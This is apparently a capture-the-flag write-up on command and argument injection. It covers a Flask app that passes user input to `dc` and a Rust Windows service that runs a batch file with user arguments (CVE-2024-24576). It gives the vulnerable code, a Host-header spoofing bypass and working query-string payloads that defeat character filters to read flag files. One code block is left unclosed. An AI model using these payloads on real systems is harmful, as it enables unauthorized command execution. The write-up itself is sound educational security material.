# System Command Injection via Web

### Technique 1 

> **Target's Backend :** Flask
>
> **Target's OS:** Linux
>
> **Originally extecuted system command :** `dc` (A calculator app)

#### Vulnerable Server Code:

```py
@app.get('/')
def index():
	sequence = request.args.get('sequence', None)
	if sequence is None:
		return render_template('index.html')

	script_file = os.path.basename(sequence + '.dc')
	if ' ' in script_file or 'flag' in script_file:
		return ':('

	proc = subprocess.run(
		['dc', script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template('index.html', output=output)
```

#### The vulnerability:

Though the command to be executed by `subprocess.run()` is supplied as **a list of strings** (instead of a single string) and the **absence of** `shell=True` might make the code look secure at the first glance, in reality we can still inject malicious arguments into the command being executed, which happens to be `dc` in this case.

Therefore, even if we cannot do stuff like `something; whoami;`, `something | whoami;`, `somethingtrue && whoami;` etc., we can still **inject valid malicious arguments to abuse the executable's intended functionality**.

We can **confirm the possibility of argument injection** by sending GET requests with query strings `?sequence=-h` and `?sequence=-V` which will lead to the execution of the commands `dc -h.dc` and `dc -V.dc`respectively (the `.dc` at the end is added by the Flask code and is immaterial here for these options).

The obtained outputs are as follows:

```bash
# For GET request ?sequence=-h

Usage: dc [OPTION] [file ...]
  -e, --expression=EXPR    evaluate expression
  -f, --file=FILE          evaluate contents of file
  -h, --help               display this help and exit
  -V, --version            output version information and exit

#### The exploit:

By looking at the man page of `dc`, we can find that **`!` helps in arbitrary system command execution**.

So the ideal cmd to be run on the target would be `dc -e!whoami`; but the Flask code adds ".dc" at the end, which will run `dc -e!whoami.dc` causing an error. So we must supply a URL encoded newline character (`%0A`) in the query string to get the needed O/p.

The query string: `?sequence=-e!whoami%0A`

**Payload that bypasses `' '` and `'flag'` filters to get the flag's content** : `?sequence=-e!cat%5C$IFS*.txt%0A`

The aim is to run `dc -e!cat\$IFS*.txt` which uses `$IFS` *(`\` to escape `$`)* to introduce space after `cat` cmd and `*.txt` helps in locating all .txt files in the current directory to be used with the `cat` cmd.


### Technique 2:

> **Target's Backend :** Rust
>
> **Target's OS :** Windows
>
> Originally executed system command was a Batch file (`.bat`) with user controlled argument.

#### The vulnerable server code:

***main.rs***
```rust
#[handler]
pub fn route_admin_run(Query(run): Query<RunQuery>) -> String {
    let RunQuery { cmd, arg } = run;
    admin::run_cmd(cmd, arg.unwrap_or("".to_string()))
}

// .
// .
// Redacted 
// for brevity
// .
// .

async fn middleware_localhost<E: Endpoint>(next: E, req: Request) -> Result<Response> {
    if let Some(host) = req.uri().host().or(req.header("host")) {
        if !host.trim_start().starts_with("127.0.0.1") {
            return Err(Error::from_status(StatusCode::UNAUTHORIZED));
        }
    } else {
        return Err(Error::from_status(StatusCode::UNAUTHORIZED));
    }

    let resp = next.call(req).await?.into_response();
    Ok(resp)
}


// .
// .
// Redacted 
// for brevity
// .
// .


// Inside async fn main()

let app = Route::new()
        .at("/", StaticFileEndpoint::new("./static/index.html"))
        .nest("/assets", StaticFilesEndpoint::new("./static/assets/"))
        .at("/preview", post(route_preview).with(SizeLimit::new(4000)))
        .nest(
            "/ai", 
            Route::new()
                .at("/", StaticFileEndpoint::new("./static/admin.html"))
                .nest("/run", get(route_admin_run)) 
                .around(middleware_localhost),
        )
        .around(middleware_csp)
// .
// .
// Redacted 
// for brevity 
// .
// .

```

From the above code, the most important inferences that can be made are:

- There is an endpoint called `/ai/run` that accepts GET requests.
- A middleware is employed that requires the `Host` header of the request to have a value of `127.0.0.1` ("intends" to restrict the service just to localhost requests).
- The `route_admin_run` handler function extracts the values of *cmd* and *arg* from the query string of the request. Then it calls the function `run_cmd` from the module "admin" and passes *cmd* and *arg* as arguments.

***admin.rs***

```rust
// .
// .
// Redacted 
// for brevity 
// .
// .
pub fn run_cmd(cmd: String, arg: String) -> String {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return "".to_string();
    }
    let res = handle_cmd(&cmd, &arg);
    match res {
        Ok(s) => s,
        Err(msg) => format!("{}", msg),
    }
}

fn handle_cmd(cmd: &str, arg: &str) -> Result<String, String> {
    eprintln!("cmd: {};  arg: {}", cmd.escape_default(), arg);
    match cmd {
        "ping" => Ok("pong".to_string()),
        "time" => { 
            let datetime: DateTime<Utc> = SystemTime::now().into();
            Ok(format!("{}", datetime.format("%T:%m-%Y-%d"))) 
        }
        "env" => {
            if arg.trim().is_empty() {
                Ok(env::vars().map(|(k, v)| format!("{k}: {v}")).join("\n"))
            } else {
                if let Ok(val) = env::var(arg) {
                    Ok(format!("{arg}: {val}"))
                } else {
                    Ok(format!("Error: no env var named '{arg}'."))
                }
            }
        }
        
// .
// .
// Redacted 
// for brevity 
// .
// .
        "ping2" => {
            if arg.contains(['\'', '"', '*', '!', '@', '^', '?']) {
                return Err("bad chars found".to_string());
            }
            let routput = Command::new(".\\scripts\\ping.bat")
                .arg(arg)
                .output();
            if let Err(_e) = routput {
                return Err("failed to run ping2 output".to_string());
            }
            Ok(String::from_utf8_lossy(&routput.unwrap().stdout).to_string())
        }
        _ => panic!("unknown cmd: {}", cmd),
    }
}
```
From the above code, the most important inferences that can be made are:

- `run_cmd` after performing some basic tasks calls `handle_cmd`.
- The most interesting part of `handle_cmd` is the "ping2" block that filters for a few bad characters and runs a batch file called `ping.bat` with `arg` supplied as an argument. The batch file in turn executes the `ping` command and a bunch of other commands.


#### The vulnerability

- The Host header's value can be easily spoofed to *127.0.0.1* using tools like **Burp Suite's Repeater**. Ensure the Target's value (present on the top right part of the window) is correctly set to the actual target host.

- Using a **bad character list is not always a complete defence** as there might be characters that the developer might not be aware of and as a result is not checked for by the filter.

- Although the utilization of `std::process::Command` to run a system command with arguments passed with `.arg()` might seem to be secure (and it generally is), a major vulnerability arises when the application executed happens to be `cmd.exe` or `.bat` scripts. This issue is caused as these files use a non-standard way of decoding arguments and can lead to arbitrary command execution (See the *Warning* section in https://doc.rust-lang.org/std/process/struct.Command.html#implementations)

#### The exploit:

There is actually a CVE for the above discussed vulnerability : **CVE-2024-24576**

The most simple payload for this vulnerability would be `something" & whoami`. But this would not work as the bad character filter would flag the presence of `"` in our payload.

Another payload that would actually work in the current situation would be:

`GET /ai/run/?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type+flag.txt HTTP/1.1`

This aims to run the command `%CMDCMDLINE:~-1%&type flag.txt`.
